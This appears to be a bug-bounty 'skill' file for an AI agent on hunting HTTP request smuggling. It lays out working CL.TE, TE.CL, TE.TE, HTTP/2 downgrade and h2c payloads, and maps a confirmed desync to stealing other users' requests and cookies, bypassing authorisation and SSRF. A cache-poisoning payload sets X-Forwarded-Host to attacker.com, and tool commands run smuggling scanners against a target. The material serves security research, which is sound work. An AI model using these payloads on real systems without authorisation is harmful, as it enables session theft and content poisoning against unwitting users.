---
name: hunt-smuggling
description: HTTP request smuggling — CL.TE, TE.CL, TE.TE, HTTP/2 downgrade, response queue poisoning.
keywords: [http smuggling, request smuggling, cl.te, te.cl, http/2, h2c, h2.cl, h2.te, response queue, desync]
---

# hunt-smuggling

## When this skill loads

Triggers: "http smuggling", "desync", "cl.te", "te.cl", "h2.cl",
"h2.te", "h2c", "response queue".

## Pre-flight — find a frontend+backend chain

Smuggling requires two HTTP processors disagreeing. Detect with:

```
Server: cloudflare         ← frontend
Via: 1.1 nginx             ← intermediate
X-Cache: HIT from varnish  ← cache
Server: gunicorn           ← backend
```

Any chain. `httptoolkit.com/blog` and PortSwigger HTTP/2 cheatsheet
list known dangerous pairs.

## Phase 1 — classic CL.TE / TE.CL (HTTP/1.1)

CL.TE — frontend honors `Content-Length`, backend honors
`Transfer-Encoding`:

```
POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

TE.CL — opposite:

```
POST / HTTP/1.1
Host: target
Content-Length: 4
Transfer-Encoding: chunked

5e
SMUGGLED HTTP/1.1
Host: target
Content-Length: 15
...
0
```

TE.TE — both honor TE but differ on parser variants:

```
Transfer-Encoding: chunked
Transfer-Encoding: cow

Transfer-Encoding: xchunked

Transfer-Encoding:[tab]chunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-encoding: chunked-X
```

## Phase 2 — HTTP/2 downgrade (H2.CL / H2.TE)

If frontend speaks HTTP/2 to client but HTTP/1.1 to backend, the
frontend re-serializes. Bugs:

- Pseudo-header injection: smuggle `\r\n` inside an HTTP/2 header
  value; H2 parser tolerates, H1 backend sees new request.
- `content-length` smuggling: HTTP/2 doesn't strictly require CL,
  but frontend adds one based on body length — if attacker also sends
  a `content-length` header, two CLs reach backend.

PortSwigger's `http-request-smuggler` Burp extension automates
detection.

## Phase 3 — response queue poisoning

The big modern attack: poison a connection so victim's response
goes to attacker.

1. Attacker sends a smuggled prefix that "claims" the next request
   on the backend connection.
2. Victim's request arrives on that connection, prefix matches,
   victim's response goes to *attacker's* original request slot.

Test by sending a smuggled `GET /404-nonexistent` prefix and
watching subsequent responses.

## Phase 4 — what to do with a confirmed desync

| Goal | Technique |
|---|---|
| Steal another user's request (incl. cookies) | Response queue poisoning |
| Bypass frontend authz | Smuggle to internal-only path the frontend would reject |
| Cache poisoning | Smuggle a request that returns attacker content for a popular URL → cached |
| XSS as a chain | Smuggle a POST that triggers stored XSS, with victim as poster |
| Internal SSRF | Smuggle headers like `X-Forwarded-Host: internal.svc` |

## Phase 5 — H2C smuggling

When a frontend proxies HTTP/2 cleartext (h2c) but doesn't filter
the `Connection: Upgrade` + `Upgrade: h2c` headers, attacker upgrades
to H2C with the backend bypassing all HTTP/1 frontend rules.

```
GET / HTTP/1.1
Host: target
Connection: Upgrade, HTTP2-Settings
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
```

Once upgraded, send arbitrary H2 frames including internal paths.

## Phase 6 — cache poisoning via smuggling

Smuggled request triggers caching of attacker payload:

```
POST / HTTP/1.1
Host: target
[smuggling primitive]

GET /important.js HTTP/1.1
Host: target
X-Forwarded-Host: attacker.com
```

If the app reflects `X-Forwarded-Host` into the response and CDN
caches by URL only, the next victim fetching `/important.js` gets
attacker-controlled content.

See also `hunt-cache-poison`.

## Tooling

```bash
# PortSwigger
# Burp → Extender → BApp Store → "HTTP Request Smuggler"

# Smuggler.py (CLI)
git clone https://github.com/defparam/smuggler && python3 smuggler/smuggler.py -u https://target -t

# h2c-smuggler
git clone https://github.com/BishopFox/h2csmuggler && python3 h2csmuggler.py -x https://target https://target/internal
```

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| H1 #498052 (Slack) | CL.TE via load balancer |
| H1 #737140 (Twitter) | TE.TE via header obfuscation |
| H1 #1063571 (HackerOne) | H2 downgrade + cache poisoning |
| CVE-2021-22965 (BIG-IP) | h2c smuggling |
| CVE-2023-25690 (Apache mod_proxy) | Smuggling via RewriteRule |
| CVE-2024-27316 (Apache HTTP/2 CONTINUATION DoS) | DoS-only |
| docs/verification/phase2h — local Docker lab reproducing CL.TE |

## Never-submit fallbacks

- "Smuggling possible" without showing a queued-poisoning victim
  → CHAIN REQUIRED.
- Smuggling chain ending in DoS-only → KILL on most programs.
- Lab reproduction only (target has been patched) → KILL.

## See also

- `hunt-cache-poison`
- `hunt-cors` — header-reflection often used in poison payload
- `docs/verification/phase2h` — Docker lab for HTTP smuggling
